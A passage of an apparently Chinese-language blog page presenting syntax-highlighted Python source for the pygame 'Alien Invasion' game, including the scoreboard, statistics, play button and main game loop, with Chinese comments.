-= self.settings.bullet_speed</span><br><span class="line">        self.rect.y = self.y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_bullet</span>(<span class="params">self</span>):</span>                                                                                   <span class="comment">#在屏幕上绘制子弹</span></span><br><span class="line">        pygame.draw.rect(self.screen, self.color, self.rect)</span><br></pre></td></tr></table></figure><h1 id="game-stats-py"><a href="#game-stats-py" class="headerlink" title="game_stats.py"></a>game_stats.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameStats</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Track statistics for Alien Invasion.&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Initialize statistics.&quot;&quot;&quot;</span></span><br><span class="line">        self.settings = ai_game.settings</span><br><span class="line">        self.reset_stats()</span><br><span class="line">        self.game_active = <span class="literal">False</span>                                           <span class="comment">#自动开启游戏</span></span><br><span class="line">        self.high_score = <span class="number">0</span>       <span class="comment">#高分永远不要重置。</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_stats</span>(<span class="params">self</span>):</span>    <span class="comment">#初始化游戏数据</span></span><br><span class="line">        self.ships_left = self.settings.ship_limit</span><br><span class="line">        self.score = <span class="number">0</span></span><br><span class="line">        self.level = <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="scoreboard-py"><a href="#scoreboard-py" class="headerlink" title="scoreboard.py"></a>scoreboard.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame.font</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Group</span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scoreboard</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game</span>):</span>                       <span class="comment">#初始化得分属性</span></span><br><span class="line">        self.ai_game = ai_game</span><br><span class="line">        self.screen = ai_game.screen</span><br><span class="line">        self.screen_rect = self.screen.get_rect()</span><br><span class="line">        self.settings = ai_game.settings</span><br><span class="line">        </span><br><span class="line">        self.stats = ai_game.stats                                      <span class="comment">#得分信息的字体设置</span></span><br><span class="line">        self.text_color = (<span class="number">30</span>, <span class="number">30</span>, <span class="number">30</span>)</span><br><span class="line">        self.font = pygame.font.SysFont(<span class="literal">None</span>, <span class="number">48</span>)</span><br><span class="line"></span><br><span class="line">        self.prep_score()                                                       <span class="comment">#初始乐谱图像</span></span><br><span class="line">        self.prep_high_score()</span><br><span class="line">        self.prep_level()</span><br><span class="line">        self.prep_ships()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_score</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Turn the score into a rendered image.&quot;&quot;&quot;</span></span><br><span class="line">        rounded_score = <span class="built_in">round</span>(self.stats.score, -<span class="number">1</span>)</span><br><span class="line">        score_str = <span class="string">&quot;&#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(rounded_score)</span><br><span class="line">        self.score_image = self.font.render(score_str, <span class="literal">True</span>,</span><br><span class="line">                self.text_color, self.settings.bg_color)</span><br><span class="line">        </span><br><span class="line">        self.score_rect = self.score_image.get_rect()               <span class="comment">#在屏幕右上方显示分数</span></span><br><span class="line">        self.score_rect.right = self.screen_rect.right - <span class="number">20</span></span><br><span class="line">        self.score_rect.top = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_high_score</span>(<span class="params">self</span>):</span>                                                     <span class="comment">#将高分转换为图像</span></span><br><span class="line">        high_score = <span class="built_in">round</span>(self.stats.high_score, -<span class="number">1</span>)</span><br><span class="line">        high_score_str = <span class="string">&quot;&#123;:,&#125;&quot;</span>.<span class="built_in">format</span>(high_score)</span><br><span class="line">        self.high_score_image = self.font.render(high_score_str, <span class="literal">True</span>,</span><br><span class="line">                self.text_color, self.settings.bg_color)</span><br><span class="line">            </span><br><span class="line">        self.high_score_rect = self.high_score_image.get_rect()          <span class="comment">#将高分居中显示在屏幕顶部</span></span><br><span class="line">        self.high_score_rect.centerx = self.screen_rect.centerx</span><br><span class="line">        self.high_score_rect.top = self.score_rect.top</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_level</span>(<span class="params">self</span>):</span>                                                                      <span class="comment">#将等级转换为渲染的图像。</span></span><br><span class="line">        level_str = <span class="built_in">str</span>(self.stats.level)</span><br><span class="line">        self.level_image = self.font.render(level_str, <span class="literal">True</span>,</span><br><span class="line">                self.text_color, self.settings.bg_color)</span><br><span class="line">    </span><br><span class="line">        self.level_rect = self.level_image.get_rect()                 <span class="comment">#将级别定位在分数下方</span></span><br><span class="line">        self.level_rect.right = self.score_rect.right</span><br><span class="line">        self.level_rect.top = self.score_rect.bottom + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prep_ships</span>(<span class="params">self</span>):</span>                                                                 <span class="comment">#显示生命值</span></span><br><span class="line">        self.ships = Group()</span><br><span class="line">        <span class="keyword">for</span> ship_number <span class="keyword">in</span> <span class="built_in">range</span>(self.stats.ships_left):</span><br><span class="line">            ship = Ship(self.ai_game)</span><br><span class="line">            ship.rect.x = <span class="number">10</span> + ship_number * ship.rect.width</span><br><span class="line">            ship.rect.y = <span class="number">10</span></span><br><span class="line">            self.ships.add(ship)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_high_score</span>(<span class="params">self</span>):</span>                                               <span class="comment">#检查是否有新高分</span></span><br><span class="line">        <span class="keyword">if</span> self.stats.score &gt; self.stats.high_score:</span><br><span class="line">            self.stats.high_score = self.stats.score</span><br><span class="line">            self.prep_high_score()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show_score</span>(<span class="params">self</span>):</span>                                                            <span class="comment">#在屏幕上面绘制分数和其它信息</span></span><br><span class="line">        self.screen.blit(self.score_image, self.score_rect)</span><br><span class="line">        self.screen.blit(self.high_score_image, self.high_score_rect)</span><br><span class="line">        self.screen.blit(self.level_image, self.level_rect)</span><br><span class="line">        self.ships.draw(self.screen)</span><br></pre></td></tr></table></figure><h1 id="botto-py"><a href="#botto-py" class="headerlink" title="botto.py"></a>botto.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame.font</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Button</span>:</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, ai_game, msg</span>):</span>                 <span class="comment">#初始化</span></span><br><span class="line">        self.screen = ai_game.screen</span><br><span class="line">        self.screen_rect = self.screen.get_rect()</span><br><span class="line">        </span><br><span class="line">        self.width, self.height = <span class="number">200</span>, <span class="number">50</span>               <span class="comment">#设置按钮的尺寸和属性</span></span><br><span class="line">        self.button_color = (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>)</span><br><span class="line">        self.text_color = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">        self.font = pygame.font.SysFont(<span class="literal">None</span>, <span class="number">48</span>)</span><br><span class="line">        </span><br><span class="line">        self.rect = pygame.Rect(<span class="number">0</span>, <span class="number">0</span>, self.width, self.height)    <span class="comment">#放置play图标</span></span><br><span class="line">        self.rect.center = self.screen_rect.center</span><br><span class="line">        </span><br><span class="line">        self._prep_msg(msg)                                  <span class="comment">#该按钮仅需准备一次</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_prep_msg</span>(<span class="params">self, msg</span>):</span>                              <span class="comment">#将其转换为渲染的图像，然后在按钮上居中显示文本。</span></span><br><span class="line">        self.msg_image = self.font.render(msg, <span class="literal">True</span>, self.text_color,</span><br><span class="line">                self.button_color)</span><br><span class="line">        self.msg_image_rect = self.msg_image.get_rect()</span><br><span class="line">        self.msg_image_rect.center = self.rect.center</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">draw_button</span>(<span class="params">self</span>):</span>                                     <span class="comment">#在屏幕上面绘制</span></span><br><span class="line">        self.screen.fill(self.button_color, self.rect)</span><br><span class="line">        self.screen.blit(self.msg_image, self.msg_image_rect)</span><br></pre></td></tr></table></figure><h1 id="重构alien-invasion-py"><a href="#重构alien-invasion-py" class="headerlink" title="重构alien_invasion.py"></a>重构alien_invasion.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> settings <span class="keyword">import</span> Settings</span><br><span class="line"><span class="keyword">from</span> game_stats <span class="keyword">import</span> GameStats</span><br><span class="line"><span class="keyword">from</span> scoreboard <span class="keyword">import</span> Scoreboard</span><br><span class="line"><span class="keyword">from</span> button <span class="keyword">import</span> Button</span><br><span class="line"><span class="keyword">from</span> ship <span class="keyword">import</span> Ship</span><br><span class="line"><span class="keyword">from</span> bullet <span class="keyword">import</span> Bullet</span><br><span class="line"><span class="keyword">from</span> alien <span class="keyword">import</span> Alien</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;管理游戏资源和行为的类&quot;&quot;&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AlienInvasion</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化游戏并创建游戏资源&quot;&quot;&quot;</span></span><br><span class="line">        pygame.init()</span><br><span class="line">        self.settings = Settings()</span><br><span class="line"></span><br><span class="line">        self.screen = pygame.display.set_mode((<span class="number">0</span>, <span class="number">0</span>), pygame.FULLSCREEN)</span><br><span class="line">        self.settings.screen_width = self.screen.get_rect().width</span><br><span class="line">        self.settings.screen_height = self.screen.get_rect().height</span><br><span class="line">        pygame.display.set_caption(<span class="string">&quot;Alien Invasion&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建一个实例来存储游戏统计信息，并创建一个记分板。&quot;&quot;&quot;</span></span><br><span class="line">        self.stats = GameStats(self)</span><br><span class="line">        self.sb = Scoreboard(self)</span><br><span class="line"></span><br><span class="line">        self.ship = Ship(self)</span><br><span class="line">        self.bullets = pygame.sprite.Group()</span><br><span class="line">        self.aliens = pygame.sprite.Group()</span><br><span class="line"></span><br><span class="line">        self._create_fleet()</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;&quot;&quot;设置play&quot;&quot;&quot;</span></span><br><span class="line">        self.play_button = Button(self, <span class="string">&quot;Play&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;开启游戏并循环&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_game</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self._check_events()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> self.stats.game_active:</span><br><span class="line">                self.ship.update()</span><br><span class="line">                self._update_bullets()</span><br><span class="line">                self._update_aliens()</span><br><span class="line"></span><br><span class="line">            self._update_screen()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键和鼠标事件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_events</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">                sys.exit()</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.KEYDOWN:</span><br><span class="line">                self._check_keydown_events(event)</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.KEYUP:</span><br><span class="line">                self._check_keyup_events(event)</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.MOUSEBUTTONDOWN:</span><br><span class="line">                mouse_pos = pygame.mouse.get_pos()</span><br><span class="line">                self._check_play_button(mouse_pos)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;当玩家单击播放时开始新游戏&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_play_button</span>(<span class="params">self, mouse_pos</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Start a new game when the player clicks Play.&quot;&quot;&quot;</span></span><br><span class="line">        button_clicked = self.play_button.rect.collidepoint(mouse_pos)</span><br><span class="line">        <span class="keyword">if</span> button_clicked <span class="keyword">and</span> <span class="keyword">not</span> self.stats.game_active:</span><br><span class="line">            <span class="comment">#重置游戏设置</span></span><br><span class="line">            self.settings.initialize_dynamic_settings()</span><br><span class="line"></span><br><span class="line">            <span class="comment">#重置游戏统计信息</span></span><br><span class="line">            self.stats.reset_stats()</span><br><span class="line">            self.stats.game_active = <span class="literal">True</span></span><br><span class="line">            self.sb.prep_score()</span><br><span class="line">            self.sb.prep_level()</span><br><span class="line">            self.sb.prep_ships()</span><br><span class="line"></span><br><span class="line">            <span class="comment">#摆脱任何剩余的外星人和子弹</span></span><br><span class="line">            self.aliens.empty()</span><br><span class="line">            self.bullets.empty()</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#建立一个新的舰队并集中舰船</span></span><br><span class="line">            self._create_fleet()</span><br><span class="line">            self.ship.center_ship()</span><br><span class="line"></span><br><span class="line">            <span class="comment">#隐藏鼠标光标</span></span><br><span class="line">            pygame.mouse.set_visible(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;响应按键&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_keydown_events</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">            self.ship.moving_right = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">            self.ship.moving_left = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_q:</span><br><span class="line">            sys.exit()</span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_SPACE:</span><br><span class="line">            self._fire_bullet()</span><br><span class="line">    </span><br><span class="line">    <span class="string">&quot;&quot;&quot;释放按键&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_keyup_events</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.key == pygame.K_RIGHT:</span><br><span class="line">            self.ship.moving_right = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> event.key == pygame.K_LEFT:</span><br><span class="line">            self.ship.moving_left = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;创建一个新的项目符号并将其添加到项目符号组&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_fire_bullet</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.bullets) &lt; self.settings.bullets_allowed:</span><br><span class="line">            new_bullet = Bullet(self)</span><br><span class="line">            self.bullets.add(new_bullet)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;更新项目符号的位置并摆脱旧项目符号&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_bullets</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 更新子弹位置</span></span><br><span class="line">        self.bullets.update()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 消除子弹</span></span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullets.copy():</span><br><span class="line">            <span class="keyword">if</span> bullet.rect.bottom &lt;= <span class="number">0</span>:</span><br><span class="line">                 self.bullets.remove(bullet)</span><br><span class="line"></span><br><span class="line">        self._check_bullet_alien_collisions()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;子弹与外星人的碰撞&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_bullet_alien_collisions</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 消除被打到的子弹和外星人</span></span><br><span class="line">        collisions = pygame.sprite.groupcollide(</span><br><span class="line">                self.bullets, self.aliens, <span class="literal">True</span>, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> collisions:</span><br><span class="line">            <span class="keyword">for</span> aliens <span class="keyword">in</span> collisions.values():</span><br><span class="line">                self.stats.score += self.settings.alien_points * <span class="built_in">len</span>(aliens)</span><br><span class="line">            self.sb.prep_score()</span><br><span class="line">            self.sb.check_high_score()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.aliens:</span><br><span class="line">            <span class="comment"># 销毁现有子弹并建立新的舰队</span></span><br><span class="line">            self.bullets.empty()</span><br><span class="line">            self._create_fleet()</span><br><span class="line">            self.settings.increase_speed()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Increase level.</span></span><br><span class="line">            self.stats.level += <span class="number">1</span></span><br><span class="line">            self.sb.prep_level()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查舰队是否处于边缘，然后更新舰队中所有外星人的位置。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_aliens</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._check_fleet_edges()</span><br><span class="line">        self.aliens.update()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 寻找与外星人的碰撞</span></span><br><span class="line">        <span class="keyword">if</span> pygame.sprite.spritecollideany(self.ship, self.aliens):</span><br><span class="line">            self._ship_hit()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 寻找外星人撞到屏幕底部</span></span><br><span class="line">        self._check_aliens_bottom()</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查是否有任何外星人到达屏幕底部&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_aliens_bottom</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_rect = self.screen.get_rect()</span><br><span class="line">        <span class="keyword">for</span> alien <span class="keyword">in</span> self.aliens.sprites():</span><br><span class="line">            <span class="keyword">if</span> alien.rect.bottom &gt;= screen_rect.bottom:</span><br><span class="line">                <span class="comment"># Treat this the same as if the ship got hit.</span></span><br><span class="line">                self._ship_hit()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;被外星人击中&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_ship_hit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.stats.ships_left &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 减少生命，并更新记分板.</span></span><br><span class="line">            self.stats.ships_left -= <span class="number">1</span></span><br><span class="line">            self.sb.prep_ships()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 摆脱任何剩余的外星人和子弹.</span></span><br><span class="line">            self.aliens.empty()</span><br><span class="line">            self.bullets.empty()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 建立一个新的舰队并集中舰船.</span></span><br><span class="line">            self._create_fleet()</span><br><span class="line">            self.ship.center_ship()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 暂停</span></span><br><span class="line">            sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.stats.game_active = <span class="literal">False</span></span><br><span class="line">            pygame.mouse.set_visible(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;建立外星人的舰队&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_fleet</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 创建一个外星人并连续查找外星人的数量。</span></span><br><span class="line">        <span class="comment"># 每个外星人之间的间距等于一个外星人的宽度。</span></span><br><span class="line">        alien = Alien(self)</span><br><span class="line">        alien_width, alien_height = alien.rect.size</span><br><span class="line">        available_space_x = self.settings.screen_width - (<span class="number">2</span> * alien_width)</span><br><span class="line">        number_aliens_x = available_space_x // (<span class="number">2</span> * alien_width)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确定适合屏幕的外星人行数</span></span><br><span class="line">        ship_height = self.ship.rect.height</span><br><span class="line">        available_space_y = (self.settings.screen_height -</span><br><span class="line">                                (<span class="number">3</span> * alien_height) - ship_height)</span><br><span class="line">        number_rows = available_space_y // (<span class="number">2</span> * alien_height)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 建立完整的外星人舰队.</span></span><br><span class="line">        <span class="keyword">for</span> row_number <span class="keyword">in</span> <span 